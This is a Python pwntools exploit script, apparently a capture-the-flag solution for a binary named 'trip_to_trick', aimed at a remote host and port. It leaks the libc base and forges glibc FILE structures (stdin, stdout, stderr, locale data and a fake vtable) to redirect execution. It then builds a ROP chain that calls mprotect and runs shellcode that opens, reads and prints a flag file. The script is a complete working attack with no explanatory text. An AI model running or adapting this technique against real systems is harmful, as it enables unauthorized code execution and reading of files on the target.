from pwn import *

#p = process('./trip_to_trick')
p = remote('138.68.67.161', 20006)
e = ELF('./trip_to_trick')
l = e.libc

p.recvuntil('0x')
libc = int(p.recvline().strip(), 16) - l.sym['system']
print 'LIBC BASE : ' + hex(libc)
print 'STDIN : ' + hex(libc+l.sym['_IO_2_1_stdin_'])

tar1 = libc+l.sym['_IO_2_1_stdin_']+0x38 # _IO_buf_base
p.sendline(hex(tar1)[2:]+' '+hex(libc+l.sym['_IO_2_1_stdin_'])[2:])

stdin = libc+l.sym['_IO_2_1_stdin_']
pay = p64(0xfbad208b)+p64(stdin+78)+p64(stdin)*6+p64(stdin+0x2000)
p.send(pay)

pay2 = p64(0xfbad208b)+p64(stdin)*8+p64(0)*6
pay2 += p64(0xffffffffffffffff)
pay2 += p64(0x0000000000000000)+p64(0x00007ffff7f7a590-0x7ffff7d93000+libc)
pay2 += p64(0xffffffffffffffff)+p64(0x0000000000000000)
pay2 += p64(0x00007ffff7f77ae0-0x7ffff7d93000+libc)+p64(0x0000000000000000)
pay2 += p64(0x0000000000000000)+p64(0x0000000000000000)
pay2 += p64(0x00000000ffffffff)+p64(0x0000000000000000)
pay2 += p64(0x0000000000000000)+p64(0x00007ffff7f79560-0x7ffff7d93000+libc)
pay2 += '\x00'*0x130
pay2 += p64(0x00007ffff7f79020-0x7ffff7d93000+libc)
pay2 += p64(0)*5 + '3'*(0x890+0x90)

# locale
pay2 += p64(0x00007ffff7f74580-0x7ffff7d93000+libc)+p64(0x00007ffff7f74ac0-0x7ffff7d93000+libc)
pay2 += p64(0x00007ffff7f74b40-0x7ffff7d93000+libc)+p64(0x00007ffff7f753c0-0x7ffff7d93000+libc)
pay2 += p64(0x00007ffff7f74900-0x7ffff7d93000+libc)+p64(0x00007ffff7f74880-0x7ffff7d93000+libc)
pay2 += p64(0)+p64(0x00007ffff7f75080-0x7ffff7d93000+libc)
pay2 += p64(0x00007ffff7f750e0-0x7ffff7d93000+libc)+p64(0x00007ffff7f75160-0x7ffff7d93000+libc)
pay2 += p64(0x00007ffff7f75220-0x7ffff7d93000+libc)+p64(0x00007ffff7f752a0-0x7ffff7d93000+libc)
pay2 += p64(0x00007ffff7f75300-0x7ffff7d93000+libc)+p64(0x00007ffff7f2d3e0-0x7ffff7d93000+libc)
pay2 += p64(0x00007ffff7f2c4e0-0x7ffff7d93000+libc)+p64(0x00007ffff7f2cae0-0x7ffff7d93000+libc)
pay2 += p64(0x00007ffff7f44678-0x7ffff7d93000+libc)+p64(0x00007ffff7f44678-0x7ffff7d93000+libc)
pay2 += p64(0x00007ffff7f44678-0x7ffff7d93000+libc)+p64(0x00007ffff7f44678-0x7ffff7d93000+libc)
pay2 += p64(0x00007ffff7f44678-0x7ffff7d93000+libc)+p64(0x00007ffff7f44678-0x7ffff7d93000+libc)
pay2 += p64(0x00007ffff7f44678-0x7ffff7d93000+libc)+p64(0x00007ffff7f44678-0x7ffff7d93000+libc)
pay2 += p64(0x00007ffff7f44678-0x7ffff7d93000+libc)+p64(0x00007ffff7f44678-0x7ffff7d93000+libc)
pay2 += p64(0x00007ffff7f44678-0x7ffff7d93000+libc)+p64(0x00007ffff7f44678-0x7ffff7d93000+libc)
pay2 += p64(0x00007ffff7f44678-0x7ffff7d93000+libc)+p64(0x0000000000000000)
pay2 += p64(0)*2

pay2 += p64(libc+l.sym['_IO_2_1_stdout_']) # _IO_list_all
pay2 += p64(0)*3

pay2 += '1'*0xe0 # stderr

pay2 += p64(0x00000000fbad2887)+p64(0x00007ffff7f787e3-0x7ffff7d93000+libc)
pay2 += p64(0x00007ffff7f787e3-0x7ffff7d93000+libc)+p64(0x00007ffff7f787e3-0x7ffff7d93000+libc)
pay2 += p64(0x00007ffff7f787e3-0x7ffff7d93000+libc)+p64(0x00007ffff7f787e3-0x7ffff7d93000+libc)
pay2 += p64(0x00007ffff7f787e3-0x7ffff7d93000+libc)+p64(0x00007ffff7f787e3-0x7ffff7d93000+libc)
pay2 += p64(0x00007ffff7f787e4-0x7ffff7d93000+libc)+p64(0x0000000000000000)
pay2 += p64(0x0000000000000000)+p64(0x0000000000000000)
pay2 += p64(0x0000000000000000)+p64(0x00007ffff7f77a00-0x7ffff7d93000+libc)
pay2 += p64(0x0000000000000001)+p64(0xffffffffffffffff)
pay2 += p64(0x0000000000000000)+p64(0x00007ffff7f7a580-0x7ffff7d93000+libc)
pay2 += p64(0xffffffffffffffff)+p64(0x0000000000000000)
pay2 += p64(0x00007ffff7f778c0-0x7ffff7d93000+libc)+p64(0x0000000000000000)
pay2 += p64(0x0000000000000000)+p64(0x0000000000000000)
pay2 += p64(0x00000000ffffffff)+p64(0x0000000000000000)
pay2 += p64(0x0000000000000000)+p64(libc+0x1e5960) # vtable

context.arch="amd64"
shellcode = shellcraft.pushstr("/home/pwn/flag")+'''
mov rdi , rsp
xor rsi , rsi
mov rax , SYS_open
syscall

mov rdi , rax
mov rsi , rsp
mov rdx , 0x100
mov rax , SYS_read
syscall

mov rdi , 1
mov rax , SYS_write
syscall
'''
shellcode = asm(shellcode)

prdi = libc + 0x26542
prsi = libc + 0x26f9e
prdx = libc + 0x12bda6

rop = p64(prdi)+p64((libc+l.sym['__malloc_hook'])&~0xfff)
rop += p64(prsi)+p64(0x3000)+p64(prdx)+p64(7)
rop += p64(libc+l.sym['mprotect'])

pay2 += p64(libc+l.sym['_IO_2_1_stderr_']) + p64(libc+l.sym['_IO_2_1_stdout_'])
pay2 += p64(libc+l.sym['_IO_2_1_stdin_']) + p64(0x00007ffff7db9e90-0x7ffff7d93000+libc)
pay2 += '0'*0x100
pay2 += p64(0)*2
pay2 += p64(libc+0x55e35)*17+p64(0)
pay2 += p64(libc+0x1e5a00)+rop # rsp
pay2 += p64(libc + 0x1e5a48)
pay2 += shellcode

sleep(1)
p.send(pay2)
p.interactive()
